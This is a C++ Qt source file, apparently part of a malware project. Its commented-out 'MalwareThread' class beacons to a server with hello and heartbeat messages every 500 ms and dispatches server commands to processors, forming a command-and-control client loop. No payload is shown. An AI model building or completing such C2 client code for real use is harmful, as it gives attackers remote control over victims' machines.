#include <QEventLoop>
#include <QObject>

#include "../Network/Http/httpserveradapter.h"
#include "../Network/Messages/Client/heartbeatmessage.h"
#include "../Network/Messages/Client/hellomessage.h"
#include "../Processors/processorresolver.h"
#include "malwarethread.h"

using namespace network;
using namespace network::http;
using namespace network::messages::client;
using namespace network::messages::server;
using namespace processors;

namespace threads
{
    /*MalwareThread::MalwareThread()
    {
    }

    void MalwareThread::run()
    {
        setUpDependencies();
        //QEventLoop e;
        updateServer();
        //e.exec();
        QThread::exec();
    }

    void MalwareThread::updateServer()
    {
        if(!hasEmittedHello_)
        {
            serverAdapter_->send(HelloMessage());
        }
        else
        {
            serverAdapter_->send(HeartbeatMessage());
        }

        if(this->isRunning())
        {
            timer_->start(500);
            //QTimer::singleShot(500, this, SLOT(updateServer()));
        }
    }

    void MalwareThread::onNewServerMessage(std::shared_ptr<ServerMessage> message)
    {
        std::shared_ptr<MessageProcessorBase> processor = processorResolver_->resolve(message);
        processor.get()->process(message, serverAdapter_);
    }

    void MalwareThread::onServerReplied()
    {
        hasEmittedHello_ = true;
    }

    void MalwareThread::onFinished()
    {
        //timer_->stop();
    }

    void MalwareThread::setUpDependencies()
    {
        processorResolver_ = std::make_unique<ProcessorResolver>();
        serverAdapter_ = std::make_unique<HttpServerAdapter>();
        QObject::connect(serverAdapter_.get(), SIGNAL(receive(std::shared_ptr<network::messages::server::ServerMessage>)), this, SLOT(onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage>)));
        QObject::connect(serverAdapter_.get(), SIGNAL(serverReplied()), this, SLOT(onServerReplied()));

        timer_ = std::make_unique<QTimer>(this);
        timer_->setSingleShot(true);
        connect(timer_.get(), SIGNAL(timeout()), this, SLOT(updateServer()));

    }*/
}
